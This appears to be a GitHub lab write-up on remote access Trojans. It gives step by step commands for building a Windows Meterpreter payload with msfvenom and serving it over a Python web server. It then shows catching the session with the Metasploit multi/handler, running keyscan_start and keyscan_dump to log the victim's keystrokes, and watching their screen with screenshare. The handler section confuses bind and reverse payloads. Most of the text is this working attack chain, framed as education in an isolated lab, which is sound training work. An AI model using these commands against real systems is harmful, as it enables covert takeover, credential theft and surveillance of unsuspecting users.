# Remote-Access-Trojan
A remote access Trojan (RAT) lab is a secure, isolated environment used for the educational analysis, detection, and remediation of RAT malware. The lab typically involves virtual machines (VMs) and monitoring tools to safely study how RATs function and how to defend against them.

1. Utilizing the line "msfvenom -p windows/meterpreter/bind_tcp -f exe > testtrojan.exe" we create a new file in the exe format called testtrojan.exe. <br/>
<img width="819" height="123" alt="image" src="https://github.com/user-attachments/assets/324f6f21-256c-454c-8546-b0d6547e2b13" />
<br/><br/>
The command msfvenom -p windows/meterpreter/bind_tcp -f exe > testtrojan.exe uses the msfvenom tool from the Metasploit Framework to generate a malicious executable file named testtrojan.exe. <br/><br/>
Here is a breakdown of the command:<br/>
* msfvenom: The command-line utility used to generate shellcode and payloads, combining the functions of legacy msfpayload and msfencode tools.<br/>
* -p windows/meterpreter/bind_tcp: Specifies the payload to use.<br/>
* windows/meterpreter/bind_tcp: This is a staged payload for Windows systems that creates a bind shell.<br/>
* A bind shell causes the generated executable to open a network port (default is usually 4444) on the compromised Windows host and listen for an incoming connection from the attacker.<br/>
* "Meterpreter" is an advanced, dynamically extensible post-exploitation agent that provides a powerful command shell and a wide range of post-exploitation capabilities once a connection is established.<br/>
* -f exe: Specifies the output format as a Windows Portable Executable (PE) file. This wraps the shellcode in an executable format that the Windows operating system can run.<br/>
* > testtrojan.exe: Redirects the output from the msfvenom command to a local file named testtrojan.exe. <br/>
In essence, this command generates a standalone Windows executable that, when run on a target Windows machine, will silently open a listening port on that machine, allowing an attacker to connect to it with a Metasploit listener and gain full control via a Meterpreter session.<br/><br/>
2. Stage a web server.<br/>
Utilizing "python -m http.server 80" we create a webserver that listens on port 80 and will deliver the file in our designated directory.  <br/>
<img width="817" height="464" alt="image" src="https://github.com/user-attachments/assets/9b819b1a-583a-4fab-bd66-dafd4880d659" />
<br/><br/>
The command python -m http.server 80 starts a basic, built-in HTTP server in the current directory, accessible over the network on TCP port 80. <br/><br/>
Breakdown of the command:<br/><br/>
* python: Invokes the Python interpreter.<br/>
* -m: Tells Python to run a specific module as a script.<br/>
* http.server: The name of the built-in Python 3 module that provides HTTP server capabilities. (In Python 2, this module was called SimpleHTTPServer).<br/>
* 80: Specifies the port number the server should listen on. Port 80 is the default port for standard, unencrypted HTTP traffic, which means the server can be accessed in a web browser without explicitly typing the port number (e.g., just http://localhost/ or http://[your_ip_address]/ instead of ...:8000/). <br/><br/>
Key functions and characteristics:<br/><br/>
* Serves Files: It serves files from the directory where the command was executed. The contents of that directory become browsable via a web browser.<br/>
* Local Development/File Sharing: It is primarily intended for local development, testing static HTML files, and quickly sharing files across a private network.<br/>
* Not for Production: It is not a full-featured, secure web server and is not recommended for production use due to limited security checks.<br/>
* Requires Privileges: Because port 80 is a privileged port (ports 0-1023), running this command typically requires administrative or root privileges (using sudo on Linux/macOS, for example). <br/><br/>
3. On the target computer the victim enters the address seen in the image above "10.0.2.4" into their web browser. <br/>
<img width="817" height="607" alt="image" src="https://github.com/user-attachments/assets/4282a042-5ef7-458c-b416-0581a11208c0" />
<br/><br/>
4. Back on the attacker side we can see that our victim has taken the bait. <br/>
<img width="724" height="160" alt="image" src="https://github.com/user-attachments/assets/49d96ae2-3c73-471f-a4e7-29baf2fd3653" />
<br/><br/>
5. After the victim clicks on our link the file is downloaded and a popup asks the user if they want to run the file. <br/>
<img width="851" height="619" alt="image" src="https://github.com/user-attachments/assets/b460b841-1085-4c0c-a1b5-0c073b217ec8" />
<br/><br/>
6. It will not appear as though anything has happened to the victims computer but back on the attackers computer we open up a metasploit console with "msfconsole".<br/>
<img width="659" height="577" alt="image" src="https://github.com/user-attachments/assets/49a4f7c3-4856-4d30-87e7-7e6ddcf1ed49" />
<br/><br/>
7. Within metasploit type "use exploit/multi/handler" which will allow us to communicate. Then type "set payload windows/meterpreter/bind_tcp" to open a listening port on our target.  Then set the target IP, which port to utilitize and then we're in. <br/>
<img width="802" height="257" alt="image" src="https://github.com/user-attachments/assets/78af4082-b962-47d0-b7d2-85242432b337" />
<br/><br/>
The Metasploit command use exploit/multi/handler loads a generic payload handler module that is used to catch incoming connections (sessions) from payloads generated outside of the main Metasploit console (e.g., with msfvenom) or from other Metasploit exploits. <br/><br/>
This module acts as a "listener" on the attacker's machine, waiting for the target system (where the payload has been executed) to connect back and establish a remote session. <br/><br/>
Once you enter the use exploit/multi/handler command, your Metasploit prompt changes, indicating you are in the handler's context. You then need to configure it with specific options to match the payload you generated earlier.<br/>
The essential steps are:<br/><br/>
* Set the Payload Type: You must specify the exact same payload used during generation (e.g., windows/meterpreter/reverse_tcp).
set PAYLOAD windows/meterpreter/reverse_tcp<br/><br/>
* Set the Local Host (LHOST): This is the IP address of your attacking machine, where the handler will listen for the incoming connection.
set LHOST 192.168.1.10 (your IP address)<br/><br/>
* Set the Local Port (LPORT): This is the port number the handler will listen on, which must match the port specified when the payload was created (default is often 4444).
set LPORT 4444<br/><br/>
* Start the Listener: Execute the module to begin listening for connections.
exploit<br/><br/> <br/>
The exploit/multi/handler is a flexible and essential tool in the Metasploit framework for managing post-exploitation sessions, especially reverse shells and Meterpreter sessions. 
<br/><br/>
8. We can now use "sysinfo" to find out what this machine is. <br/>
<img width="625" height="165" alt="image" src="https://github.com/user-attachments/assets/050340c2-dc24-4a6a-b967-05569a2819d1" />
<br/><br/>
9. Utilizing the command "shell" it will drop you into the CLI where we can find out our username and see that our username is a part of the administrator group.<br/>
<img width="548" height="650" alt="image" src="https://github.com/user-attachments/assets/71226fe3-aae4-43d6-9a61-70119f9b012f" />
<br/><br/>
10. Exit out of the CLI and back to the meterpreter command line and enter "keyscan_start". <br/>
<img width="395" height="100" alt="image" src="https://github.com/user-attachments/assets/bb5e3400-cea1-4ea6-aa4a-da6a9f14719c" />
<br/><br/>
The command keyscan_start is a Meterpreter command used to begin a remote keystroke capture (keylogging) session on a compromised Windows system. <br/><br/>
How it Works:<br/><br/>
* It is run from within an active Metasploit Meterpreter session.<br/><br/>
* The command spawns a new thread within the target process on the remote machine.<br/><br/>
* This thread continuously checks the state of the target's keyboard (every 30 milliseconds).<br/><br/>
* Captured keystrokes are stored silently in an in-memory buffer on the target system. <br/>
<br/><br/>
11. The user goes about using their computer as normal.<br/>
<img width="1007" height="546" alt="image" src="https://github.com/user-attachments/assets/e43ee9ff-c3fa-4f02-aa4d-4030d20c4fa8" />
<br/><br/>
12. Meanwhile the attacker uses line "keyscan_dump". In order to see what the victim is typing. <br/>
<img width="485" height="114" alt="image" src="https://github.com/user-attachments/assets/5adbd5aa-be90-4651-a0df-56c1887ef6bd" />
<br/><br/>
13. To take it a step further the attacker can use the line "screenshare" and they will see the victim's screen in real time.<br/>
<img width="1519" height="823" alt="image" src="https://github.com/user-attachments/assets/72bafa7b-4db2-449e-b065-5bcd818554ae" />
<br/><br/>
